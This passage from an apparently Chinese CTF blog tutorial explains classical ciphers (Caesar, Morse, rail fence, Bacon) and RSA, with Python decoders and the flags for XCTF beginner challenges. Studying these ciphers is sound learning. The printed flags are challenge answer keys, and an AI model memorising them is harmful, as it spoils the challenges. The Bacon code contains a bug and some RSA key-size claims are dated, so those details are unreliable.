<p>运行，得到结果：cyberpeace{Welcome_to_new_World!}</p>
<h1 id="凯撒密码-Caesar-Cipher"><a href="#凯撒密码-Caesar-Cipher" class="headerlink" title="凯撒密码(Caesar Cipher)"></a>凯撒密码(Caesar Cipher)</h1><blockquote>
<p>在密码学中，<strong>恺撒密码</strong>（英语：Caesar cipher），或称<strong>恺撒加密</strong>、<strong>恺撒变换</strong>、<strong>变换加密</strong>，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。</p>
</blockquote>
<h2 id="加密原理-1"><a href="#加密原理-1" class="headerlink" title="加密原理"></a>加密原理</h2><p>在加密时，明文中的每个字母按照字母表的顺序向前或向后移动某一特定的位数并替换得到密文。例如明文为：FLAGISHERE，偏移量为3，那么密文就得到了：IODJLVKHUH，解密时则反向移动3位或正向移动26-3=23位。</p>
<h2 id="例题分析-1"><a href="#例题分析-1" class="headerlink" title="例题分析"></a>例题分析</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=0&id=5110&page=1">Caesar</a></p>
<h3 id="分析与解答-1"><a href="#分析与解答-1" class="headerlink" title="分析与解答"></a>分析与解答</h3><p>根据字母的个数以及排列方式来看很明显对字母采用了凯撒加密，只需根据攻防世界常见的“cyberpeace”开头的flag格式得到正向偏移量为14，以此编写代码如下：</p>
<pre class="language-python" data-language="python"><code class="language-python">wordList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'f'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'j'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span>
            <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'u'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">]</span>
t <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>  <span class="token comment"># 1.txt为题目附件</span>
string <span class="token operator">=</span> t<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
n_str <span class="token operator">=</span> <span class="token string">''</span>
n <span class="token operator">=</span> <span class="token number">14</span>
<span class="token keyword">for</span> s <span class="token keyword">in</span> string<span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'a'</span> <span class="token operator">&lt;=</span> s <span class="token operator">&lt;=</span> <span class="token string">'z'</span><span class="token punctuation">:</span>
        index <span class="token operator">=</span> wordList<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
        n_index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">+</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span>
        n_str <span class="token operator">+=</span> wordList<span class="token punctuation">[</span>n_index<span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        n_str <span class="token operator">+=</span> s
<span class="token keyword">print</span><span class="token punctuation">(</span>n_str<span class="token punctuation">)</span>
t<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>运行，得到flag：cyberpeace{you_have_learned_caesar_encryption}</p>
<h1 id="摩尔斯电码-Morse-Code"><a href="#摩尔斯电码-Morse-Code" class="headerlink" title="摩尔斯电码(Morse Code)"></a>摩尔斯电码(Morse Code)</h1><blockquote>
<p>摩尔斯电码也被称作摩斯密码，是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。它发明于1837年，是一种早期的数字化通信形式。不同于现代化的数字通讯，摩尔斯电码只使用零和一两种状态的二进制代码，它的代码包括五种：短促的点信号“・”，保持一定时间的长信号“—”，表示点和划之间的停顿、每个词之间中等的停顿，以及句子之间长的停顿。</p>
</blockquote>
<h2 id="加密原理-2"><a href="#加密原理-2" class="headerlink" title="加密原理"></a>加密原理</h2><p>摩尔斯电码的加密原理比较简单，就是长信号（一般为“—”）与短信号（一般为“·”）的组合来替换常见的字符，比如明文为：SOS，对应摩尔斯电码表加密后得到：··· — — — ···</p>
<p><img src="/2021/08/09/Crypto%E5%9F%BA%E7%A1%80/Morse.png"></p>
<h2 id="例题分析-2"><a href="#例题分析-2" class="headerlink" title="例题分析"></a>例题分析</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=0&id=5111&page=1">Morse</a></p>
<h3 id="分析与解答-2"><a href="#分析与解答-2" class="headerlink" title="分析与解答"></a>分析与解答</h3><p>附件中仅由“0”和“1”构成，且每一部分以空格分开，则考虑采用了摩尔斯加密。将摩尔斯电码表中的对应关系定义为一个字典类型，遍历密文中的每一部分并得到明文字符，python代码如下：</p>
<pre class="language-python" data-language="python"><code class="language-python">t <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'2.txt'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>  <span class="token comment"># 2.txt为题目附件</span>
codes <span class="token operator">=</span> t<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>
dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'01'</span><span class="token punctuation">:</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'1000'</span><span class="token punctuation">:</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'1010'</span><span class="token punctuation">:</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'100'</span><span class="token punctuation">:</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'0010'</span><span class="token punctuation">:</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'110'</span><span class="token punctuation">:</span> <span class="token string">'G'</span><span class="token punctuation">,</span>
       <span class="token string">'0000'</span><span class="token punctuation">:</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'00'</span><span class="token punctuation">:</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'0111'</span><span class="token punctuation">:</span> <span class="token string">'J'</span><span class="token punctuation">,</span> <span class="token string">'101'</span><span class="token punctuation">:</span> <span class="token string">'K'</span><span class="token punctuation">,</span> <span class="token string">'0100'</span><span class="token punctuation">:</span> <span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">'11'</span><span class="token punctuation">:</span> <span class="token string">'M'</span><span class="token punctuation">,</span> <span class="token string">'10'</span><span class="token punctuation">:</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'111'</span><span class="token punctuation">:</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'0110'</span><span class="token punctuation">:</span> <span class="token string">'P'</span><span class="token punctuation">,</span>
       <span class="token string">'1101'</span><span class="token punctuation">:</span> <span class="token string">'Q'</span><span class="token punctuation">,</span> <span class="token string">'010'</span><span class="token punctuation">:</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'000'</span><span class="token punctuation">:</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'001'</span><span class="token punctuation">:</span> <span class="token string">'U'</span><span class="token punctuation">,</span> <span class="token string">'0001'</span><span class="token punctuation">:</span> <span class="token string">'V'</span><span class="token punctuation">,</span> <span class="token string">'011'</span><span class="token punctuation">:</span> <span class="token string">'W'</span><span class="token punctuation">,</span> <span class="token string">'1001'</span><span class="token punctuation">:</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token string">'1011'</span><span class="token punctuation">:</span> <span class="token string">'Y'</span><span class="token punctuation">,</span>
       <span class="token string">'1100'</span><span class="token punctuation">:</span> <span class="token string">'Z'</span><span class="token punctuation">,</span> <span class="token string">'01111'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'00111'</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'00011'</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'00001'</span><span class="token punctuation">:</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'00000'</span><span class="token punctuation">:</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'10000'</span><span class="token punctuation">:</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'11000'</span><span class="token punctuation">:</span> <span class="token string">'7'</span><span class="token punctuation">,</span>
       <span class="token string">'11100'</span><span class="token punctuation">:</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'11110'</span><span class="token punctuation">:</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'11111'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'001100'</span><span class="token punctuation">:</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'10010'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'101101'</span><span class="token punctuation">:</span> <span class="token string">'()'</span><span class="token punctuation">,</span> <span class="token string">'100001'</span><span class="token punctuation">:</span> <span class="token string">'-'</span><span class="token punctuation">,</span>
       <span class="token string">'010101'</span><span class="token punctuation">:</span> <span class="token string">'.'</span><span class="token punctuation">&#125;</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> codes<span class="token punctuation">:</span>
    <span class="token keyword">if</span> c <span class="token keyword">in</span> dic<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> dic<span class="token punctuation">[</span>c<span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token string">'*'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
t<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>运行，flag以小写字母输出并格式化：cyberpeace{morsecodeissointeresting}</p>
<h1 id="二进制幂数加密-Binary-idempotent-encryption"><a href="#二进制幂数加密-Binary-idempotent-encryption" class="headerlink" title="二进制幂数加密(Binary idempotent encryption)"></a>二进制幂数加密(Binary idempotent encryption)</h1><blockquote>
<p>二进制幂数加密法，由于英文字母只有26个字母。只要2的0、1、2、3、4、5次幂就可以表示31个单元。通过用二进制幂数表示字母序号数来加密。</p>
</blockquote>
<h2 id="加密原理-3"><a href="#加密原理-3" class="headerlink" title="加密原理"></a>加密原理</h2><p>在进行二进制数转十进制数的结果为二进制各位数的幂数之和，例如1010转换成十进制数时：2^1+2^3=10，并且N位二进制数能表示的最大十进制数为2^n-1，如四位二进制数最多可表示的十进制数为1111，即15。</p>
<p>由于英文字母总数为26，因此我们只需5位二进制数即可表示所有的英文字母(2^5-1=31)，例如：</p>
<p>明文：I LOVE CRYPTO</p>
<p>字母序号：9/12 15 22 5/3 18 25 16 20 15（空格表示字母的间隔，斜杠表示单词的间隔）</p>
<p>由于9=2^0+2^3，因此加密结果为：03，以此类推</p>
<p>密文：  03/23 0123 124 02/01 14 034 4 24 0123</p>
<h1 id="栅栏密码-Rail-fence-Cipher"><a href="#栅栏密码-Rail-fence-Cipher" class="headerlink" title="栅栏密码(Rail-fence Cipher)"></a>栅栏密码(Rail-fence Cipher)</h1><h2 id="传统栅栏密码"><a href="#传统栅栏密码" class="headerlink" title="传统栅栏密码"></a>传统栅栏密码</h2><h3 id="加密原理-4"><a href="#加密原理-4" class="headerlink" title="加密原理"></a>加密原理</h3><p>首先确定一个key值，将明文字母按从上往下的顺序依次交替排列成key行，最后每行字母依次连接组成新字符串，得到密文。例如：</p>
<p>明文：HAVE A GOOD DAY        key值：3</p>
<p>将字母依次交替排列成3行： </p>
<table>
<thead>
<tr>
<th>H</th>
<th>E</th>
<th>O</th>
<th>D</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>A</td>
<td>O</td>
<td>A</td>
</tr>
<tr>
<td>V</td>
<td>G</td>
<td>D</td>
<td>Y</td>
</tr>
</tbody></table>
<p>最后每行字母依次连接得到密文：HEODAAOAVGDY</p>
<p>值得一提的是，栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p>
<h2 id="W型栅栏密码"><a href="#W型栅栏密码" class="headerlink" title="W型栅栏密码"></a>W型栅栏密码</h2><h3 id="加密原理-5"><a href="#加密原理-5" class="headerlink" title="加密原理"></a>加密原理</h3><p>与传统栅栏密码类似，第一步先确定key值，在排列明文字母时不是垂直纵向排列，而是斜向45度角进行排列，且在排列key行后，变换方向后继续排列（右下变右上，右上变右下），组成多个“W”形，最后每行字母依次连接组成新字符串，得到密文。例如：</p>
<p>明文：HAVE A GOOD DAY        key值：3</p>
<p>将字母按“W”形排列成3行：  </p>
<table>
<thead>
<tr>
<th>H</th>
<th>.</th>
<th>.</th>
<th>.</th>
<th>A</th>
<th>.</th>
<th>.</th>
<th>.</th>
<th>D</th>
<th>.</th>
<th>.</th>
<th>.</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>A</td>
<td>.</td>
<td>E</td>
<td>.</td>
<td>G</td>
<td>.</td>
<td>o</td>
<td>.</td>
<td>D</td>
<td>.</td>
<td>Y</td>
</tr>
<tr>
<td>.</td>
<td>.</td>
<td>V</td>
<td>.</td>
<td>.</td>
<td>.</td>
<td>O</td>
<td>.</td>
<td>.</td>
<td>.</td>
<td>A</td>
<td>.</td>
</tr>
</tbody></table>
<p>最后每行依次连接得到密文：HADAEGODYVOA</p>
<h3 id="例题分析-3"><a href="#例题分析-3" class="headerlink" title="例题分析"></a>例题分析</h3><h4 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h4><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=0&id=5112&page=1">Railfence</a></p>
<h4 id="分析与解答-3"><a href="#分析与解答-3" class="headerlink" title="分析与解答"></a>分析与解答</h4><p>密文看上去就是被打乱的flag值，基本上就是栅栏加密的结果，并且发现是W型栅栏加密。可以直接使用在线栅栏解密：</p>
<p><a href="http://www.atoolbox.net/Tool.php?Id=777">在线栅栏解密</a></p>
<h1 id="培根密码-Bacon-Cipher"><a href="#培根密码-Bacon-Cipher" class="headerlink" title="培根密码(Bacon Cipher)"></a>培根密码(Bacon Cipher)</h1><h2 id="加密原理-6"><a href="#加密原理-6" class="headerlink" title="加密原理"></a>加密原理</h2><p>培根加密时，明文中每个字母会转换成一组五个由<strong>a</strong>和<strong>b</strong>组成的字母，其转换关系表如下：</p>
<table>
<thead>
<tr>
<th>A/a</th>
<th>aaaaa</th>
<th>H/h</th>
<th>aabbb</th>
<th>O/o</th>
<th>abbba</th>
<th>V/v</th>
<th>babab</th>
</tr>
</thead>
<tbody><tr>
<td>B/b</td>
<td>aaaab</td>
<td>I/i</td>
<td>abaaa</td>
<td>P/p</td>
<td>abbbb</td>
<td>W/w</td>
<td>babba</td>
</tr>
<tr>
<td>C/c</td>
<td>aaaba</td>
<td>J/j</td>
<td>abaab</td>
<td>Q/q</td>
<td>baaaa</td>
<td>X/x</td>
<td>babbb</td>
</tr>
<tr>
<td>D/d</td>
<td>aaabb</td>
<td>K/k</td>
<td>ababa</td>
<td>R/r</td>
<td>baaab</td>
<td>Y/y</td>
<td>bbaaa</td>
</tr>
<tr>
<td>E/e</td>
<td>aabaa</td>
<td>L/l</td>
<td>ababb</td>
<td>S/s</td>
<td>baaba</td>
<td>Z/z</td>
<td>bbaab</td>
</tr>
<tr>
<td>F/f</td>
<td>aabab</td>
<td>M/m</td>
<td>abbaa</td>
<td>T/t</td>
<td>baabb</td>
<td></td>
<td></td>
</tr>
<tr>
<td>G/g</td>
<td>aabba</td>
<td>N/n</td>
<td>abbab</td>
<td>U/u</td>
<td>babaa</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>事实上，一般情况下，密文最终形式并不会由a和b组成，加密者通常会准备两种不同的字体，分别代表a和b，并且用一段由这两种字体所格式化的虚假信息作为密文，例如密文为：flag<strong>is</strong>he<strong>re</strong>，根据字体的差异，将未加粗字体看作a，加粗字体看作b，得到：aaaab baabb，对照关系表得到明文为：bt.</p>
<p>弗朗西斯·培根还另外准备了一种方法，将大小写分别看作a和b，这样可以适用在无法使用不同字体的场合，比如在处理纯文字的数据时。</p>
<p>其实培根密码还有另外一种加密关系：</p>
<table>
<thead>
<tr>
<th>a</th>
<th>AAAAA</th>
<th>g</th>
<th>AABBA</th>
<th>n</th>
<th>ABBAA</th>
<th>t</th>
<th>BAABA</th>
</tr>
</thead>
<tbody><tr>
<td>b</td>
<td>AAAAB</td>
<td>h</td>
<td>AABBB</td>
<td>o</td>
<td>ABBAB</td>
<td>u-v</td>
<td>BAABB</td>
</tr>
<tr>
<td>c</td>
<td>AAABA</td>
<td>i-j</td>
<td>ABAAA</td>
<td>p</td>
<td>ABBBA</td>
<td>w</td>
<td>BABAA</td>
</tr>
<tr>
<td>d</td>
<td>AAABB</td>
<td>k</td>
<td>ABAAB</td>
<td>q</td>
<td>ABBBB</td>
<td>x</td>
<td>BABAB</td>
</tr>
<tr>
<td>e</td>
<td>AABAA</td>
<td>l</td>
<td>ABABA</td>
<td>r</td>
<td>BAAAA</td>
<td>y</td>
<td>BABBA</td>
</tr>
<tr>
<td>f</td>
<td>AABAB</td>
<td>m</td>
<td>ABABB</td>
<td>s</td>
<td>BAAAB</td>
<td>z</td>
<td>BABBB</td>
</tr>
</tbody></table>
<p>在解密培根密码时两种加密关系都要考虑。</p>
<h2 id="例题分析-4"><a href="#例题分析-4" class="headerlink" title="例题分析"></a>例题分析</h2><h3 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=0&id=5117&page=1">不仅仅是Morse</a></p>
<h3 id="分析与解答-4"><a href="#分析与解答-4" class="headerlink" title="分析与解答"></a>分析与解答</h3><p>观察密文，很明显是莫尔斯电码的形式，摩尔斯解密之后，得到如下结果：</p>
<p><img src="/2021/08/09/Crypto%E5%9F%BA%E7%A1%80/Bacon.png"></p>
<p><strong>may be have another deconde</strong>  提示我们这并不是最终结果，后面还有另外一种加密方式，可以看到后面字母由a和b组成，考虑是培根加密，可以编写python程序解密：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re


<span class="token keyword">def</span> <span class="token function">Bacon</span><span class="token punctuation">(</span>in_string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    first_cipher <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaaa"</span><span class="token punctuation">,</span> <span class="token string">"aaaab"</span><span class="token punctuation">,</span> <span class="token string">"aaaba"</span><span class="token punctuation">,</span> <span class="token string">"aaabb"</span><span class="token punctuation">,</span> <span class="token string">"aabaa"</span><span class="token punctuation">,</span> <span class="token string">"aabab"</span><span class="token punctuation">,</span> <span class="token string">"aabba"</span><span class="token punctuation">,</span> <span class="token string">"aabbb"</span><span class="token punctuation">,</span> <span class="token string">"abaaa"</span><span class="token punctuation">,</span> <span class="token string">"abaab"</span><span class="token punctuation">,</span> <span class="token string">"ababa"</span><span class="token punctuation">,</span>
                    <span class="token string">"ababb"</span><span class="token punctuation">,</span> <span class="token string">"abbaa"</span><span class="token punctuation">,</span> <span class="token string">"abbab"</span><span class="token punctuation">,</span> <span class="token string">"abbba"</span><span class="token punctuation">,</span> <span class="token string">"abbbb"</span><span class="token punctuation">,</span> <span class="token string">"baaaa"</span><span class="token punctuation">,</span> <span class="token string">"baaab"</span><span class="token punctuation">,</span> <span class="token string">"baaba"</span><span class="token punctuation">,</span> <span class="token string">"baabb"</span><span class="token punctuation">,</span> <span class="token string">"babaa"</span><span class="token punctuation">,</span> <span class="token string">"babab"</span><span class="token punctuation">,</span>
                    <span class="token string">"babba"</span><span class="token punctuation">,</span> <span class="token string">"babbb"</span><span class="token punctuation">,</span> <span class="token string">"bbaaa"</span><span class="token punctuation">,</span> <span class="token string">"bbaab"</span><span class="token punctuation">]</span>

    second_cipher <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"aaaaa"</span><span class="token punctuation">,</span> <span class="token string">"aaaab"</span><span class="token punctuation">,</span> <span class="token string">"aaaba"</span><span class="token punctuation">,</span> <span class="token string">"aaabb"</span><span class="token punctuation">,</span> <span class="token string">"aabaa"</span><span class="token punctuation">,</span> <span class="token string">"aabab"</span><span class="token punctuation">,</span> <span class="token string">"aabba"</span><span class="token punctuation">,</span> <span class="token string">"aabbb"</span><span class="token punctuation">,</span> <span class="token string">"abaaa"</span><span class="token punctuation">,</span> <span class="token string">"abaaa"</span><span class="token punctuation">,</span> <span class="token string">"abaab"</span><span class="token punctuation">,</span>
                     <span class="token string">"ababa"</span><span class="token punctuation">,</span> <span class="token string">"ababb"</span><span class="token punctuation">,</span> <span class="token string">"abbaa"</span><span class="token punctuation">,</span> <span class="token string">"abbab"</span><span class="token punctuation">,</span> <span class="token string">"abbba"</span><span class="token punctuation">,</span> <span class="token string">"abbbb"</span><span class="token punctuation">,</span> <span class="token string">"baaaa"</span><span class="token punctuation">,</span> <span class="token string">"baaab"</span><span class="token punctuation">,</span> <span class="token string">"baaba"</span><span class="token punctuation">,</span> <span class="token string">"baabb"</span><span class="token punctuation">,</span> <span class="token string">"baabb"</span><span class="token punctuation">,</span>
                     <span class="token string">"babaa"</span><span class="token punctuation">,</span> <span class="token string">"babab"</span><span class="token punctuation">,</span> <span class="token string">"babba"</span><span class="token punctuation">,</span> <span class="token string">"babbb"</span><span class="token punctuation">]</span>
    res1 <span class="token operator">=</span> <span class="token string">""</span>
    res2 <span class="token operator">=</span> <span class="token string">""</span>
    in_string <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span>in_string<span class="token punctuation">)</span>
    str_group <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">".&#123;5&#125;"</span><span class="token punctuation">,</span> in_string<span class="token punctuation">)</span>
    <span class="token keyword">for</span> s_g <span class="token keyword">in</span> str_group<span class="token punctuation">:</span>
        n1 <span class="token operator">=</span> first_cipher<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s_g<span class="token punctuation">)</span>
        n2 <span class="token operator">=</span> second_cipher<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s_g<span class="token punctuation">)</span>
        res1 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>n1 <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>
        res2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>n1 <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"first_cypher: "</span><span class="token punctuation">,</span> res1<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"second_cypher: "</span><span class="token punctuation">,</span> res2<span class="token punctuation">)</span></code></pre>

<p>解密得到结果：ATTACKANDDEFENCEWORLDISINTERESTING</p>
<p>格式化后得到flag值：cyberpeace{attackanddefenceworldisinteresting}</p>
<h1 id="RSA算法-RSA-algorithm"><a href="#RSA算法-RSA-algorithm" class="headerlink" title="RSA算法(RSA algorithm)"></a>RSA算法(RSA algorithm)</h1><blockquote>
<p>RSA是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的</p>
</blockquote>
<p>RSA算法是引用最为广泛的一种公钥加密算法，所谓公钥加密(public key encryption)，也叫非对称加密。加密过程中，用于对数据加密的密钥称为公钥，对所有人公开，而对数据解密的密钥称为私钥，由接收者所保存，不对外公开。</p>
<h2 id="加密原理-7"><a href="#加密原理-7" class="headerlink" title="加密原理"></a>加密原理</h2><h3 id="数学原理"><a href="#数学原理" class="headerlink" title="数学原理"></a>数学原理</h3><p>因为用以加密的公钥是对外公开的，那么我们应当保证解密的密钥无法被根据公钥反推出来，那要达到此目的必须使用到单向函数(One-way function)，即对于每一个输入，函数值都容易计算，但给出一个随机的函数值，要计算出原始的输入数据却很困难。常见的比如模运算：m^e mod n = c，已知m,e,n要求出密文c很简单，而已知e,n,c要求出明文m却很困难，RSA算法正是运用了这一特性。</p>
<p>将加密方程变换：c^d mod n = m，其中d就是用以解密的密钥，它本身也不能被公开的n和e反推出来，根据数论：寻求两个大素数比较简单，而将它们的乘积质因数分解却极为困难。加密方程可以写成：m^e =  kn + c (k为正整数)，将c^d = (m^e - kn)^d带入解密方程中得到：(m^e - kn)^d mod n = m，由于(m^e - kn)^d多项式展开后的结果中只有m^ed项不包含n的乘积，因此方程化简为：m^ed mod n = m，可见，正确选取e和d使其满足此方程成为了算法的核心所在。</p>
<p>根据欧拉定理：m，n为正整数，且gcd(m,n) = 1，则有m^φ(n) ≡ 1(mod n)，其中φ(n)称为对模n缩系的元素个数，即在小于等于n的正整数中与n互质的数的个数。对于一个大数n而言，要求出φ(n)的值是很困难的，但如果这个数本身就是质数，那么显然φ(n)=n-1。此外，φ(n)还有一个特性：对于互质的两个正整数p,q而言，φ(pq) = φ(p)φ(q)，那么我们在选取n的值时可以先选取互质的两个数p和q，根据以上定理，n = pq，φ(n) = φ(pq) = (p-1)(q-1)。</p>
<p>根据以上原理，我们将欧拉定理方程进行变换，等式两端同时取k次幂并乘上m，最后变换成模运算的形式得到：m^{kφ(n)+1} mod n = m，与我们之前得到的 m^ed mod n = m 相比照，联立两式：ed = kφ(n) + 1，写成模运算形式：ed mod φ(n) = 1，因此我们可以通过选取加密密钥e来得到解密密钥d，值得注意的是这里e值的选取必须保证gcd(e,φ(n)) = 1，否则d值将不存在，具体数学证明略。</p>
<p>最终将e和n的值公布，作为加密公钥，将d的值保留作为解密私钥。由于他人未知p和q的值，且n是一个大数的情况下对n进行质因数分解十分困难，也就无法得到φ(n)的值，就无法根据e求得d。</p>
<p>RSA允许你选择公钥大小。512位密钥被视为不安全；768位密钥不用担心受到除了国家安全管理（NSA）外其他事物的危害；1024位几乎是安全的。</p>
<p><em>加密原理参考链接</em>：<a href="https://www.bilibili.com/video/BV14y4y1272w">探秘公钥加密算法RSA</a></p>
<h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h3><p>（1）选取两个大素数p和q，得到乘积n = pq，则φ(n) = (p-1)(q-1)。</p>
<p>（2）选取一个大整数e，满足gcd(e,φ(n)) = 1。</p>
<p>（3）根据方程 ed mod φ(n) = 1 确定d的值。</p>
<p>（4）公开n和e，作为公钥，私密保存d，作为私钥。</p>
<p>（5）加密方程为：c = m^e mod n.    解密方程为：m = c^d mod n</p>
<h2 id="例题分析-5"><a href="#例题分析-5" class="headerlink" title="例题分析"></a>例题分析</h2><h3 id="题目链接-5"><a href="#题目链接-5" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=0&id=5114&page=1">easy_RSA</a></p>
<h3 id="分析与解答-5"><a href="#分析与解答-5" class="headerlink" title="分析与解答"></a>分析与解答</h3><p>题目直接给出了p，q，e的值，要求求解d，得到φ(n)后根据 ed mod φ(n) = 1求解即可，这里我直接将模运算写成了 ed = kφ(n) + 1，并遍历k的值，若e能被 kφ(n) + 1 整除则得到解密密钥d。</p>
<pre class="language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">473398607161</span>
q <span class="token operator">=</span> <span class="token number">4511491</span>
e <span class="token operator">=</span> <span class="token number">17</span>
